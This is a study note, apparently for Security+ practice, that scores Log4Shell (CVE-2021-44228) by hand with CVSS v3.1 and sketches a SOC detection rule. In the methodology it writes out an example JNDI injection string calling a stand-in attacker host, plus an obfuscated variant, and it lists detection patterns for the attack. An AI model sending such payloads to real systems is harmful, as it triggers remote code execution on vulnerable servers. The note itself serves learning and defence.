# CVSS Scoring Practice - Log4Shell (CVE-2021-44228)

**Path:** Security+ SY0-701, Domain 4 (Security Operations)
**Date:** 2026-10-05
**Category:** Vulnerability Management

## Objective
Score a real CVE by hand with CVSS v3.1 before looking up the official number, then compare. Also get the vuln scan vs pentest difference down to one sentence.

## Tools used
- NVD for the official record
- FIRST's CVSS v3.1 calculator for the metric weights

## Methodology
I picked Log4Shell because everyone knows it and it's a good one to practise on. Short version of the bug: Log4j 2.x up to 2.14.1 will resolve a JNDI lookup if one shows up in a logged string, so something like `${jndi:ldap://attacker.example/x}` in a User-Agent header makes the server call out to the attacker and load whatever comes back. 2.15.0 was the first fix but it wasn't complete (CVE-2021-45046), so 2.16.0 or later is what you actually want.

Scoring the metrics before checking NVD:

- Attack Vector: Network. It comes in over HTTP.
- Attack Complexity: Low. A default config of an affected version is enough, nothing to race or chain.
- Privileges Required: None. The payload rides in a header on an unauthenticated request.
- User Interaction: None. Nobody clicks anything, the server logs it by itself.
- Scope: Changed. The bug is in a logging library but what gets owned is the whole app and the host around it.
- C/I/A: High, High, High. It's code execution, so whatever the app can touch, the attacker can touch.

Vector I ended up with:
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

Then the maths, so I actually understand where the number comes from:
```
ISS            = 1 - (0.44 x 0.44 x 0.44)                          = 0.9148
Impact         = 7.52 x (0.9148 - 0.029) - 3.25 x (0.9148 - 0.02)^15 = ~6.05
Exploitability = 8.22 x 0.85 x 0.77 x 0.85 x 0.85                  = ~3.89
Base           = min(1.08 x (6.05 + 3.89), 10)                     = 10.0
```
The raw sum is around 10.7 so it just gets capped at 10.

NVD has the same vector and 10.0 Critical, so I matched.

What I found interesting is Scope. Change it to Unchanged and the exact same bug scores 9.8, which is what a normal unauthenticated RCE gets. So Scope is the only reason Log4Shell sits at a full 10. The follow-up bug CVE-2021-45046 is a good comparison too: Oracle's advisory has it at 9.0 because Attack Complexity is High on that one.

The score doesn't tell you whether it matters in your environment. A 10.0 in a jar on a machine nobody can reach isn't the same as a 10.0 on an internet-facing Java app. For prioritising you'd also look at whether it's exposed, whether there's a working exploit (Log4Shell is on CISA's known exploited list) and how important the asset is.

Vuln scan vs pentest in one sentence: a vulnerability scan is automated and broad and just lists known weaknesses without exploiting them, while a pentest is manual and goal-driven and actually exploits them to show what an attacker could really do.

## Detection angle (SOC-relevant)
In logs this shows up in two steps, and it's the pair that makes a decent alert.

First the attempt: a web request with `${jndi:` somewhere in it, usually User-Agent, Referer, X-Forwarded-For or the URL. The log source is the web server, reverse proxy or WAF. A plain match for `${jndi:` catches the lazy attempts, but people obfuscate it (`${${lower:j}ndi:...}`) so a real rule needs to normalise first or use a looser pattern.

Second the callback: the vulnerable server opens an outbound LDAP, LDAPS or RMI connection (ports 389, 636, 1099) or does a strange DNS lookup. App servers almost never do that on their own, so it stands out in firewall or DNS logs. If you want a third step, a java process spawning a shell or curl/wget shows up in process creation logs (Sysmon event 1, Windows 4688).

The alert I'd write: external IP sends a request with a JNDI string, and within about a minute the same server connects out on 389 or 1099. The first half alone is just internet noise since everyone was scanning for this. Both together is worth waking someone up for.

On the vuln management side, a 10.0 that's being actively exploited goes straight to the top of the patch list, and finding the affected assets means a scanner plugin or searching for log4j-core jars.

## Key takeaway
CVSS is just a formula, and one metric (Scope) is the gap between 9.8 and 10. The score is where prioritising starts, not where it ends. Exposure and active exploitation matter more than the number.
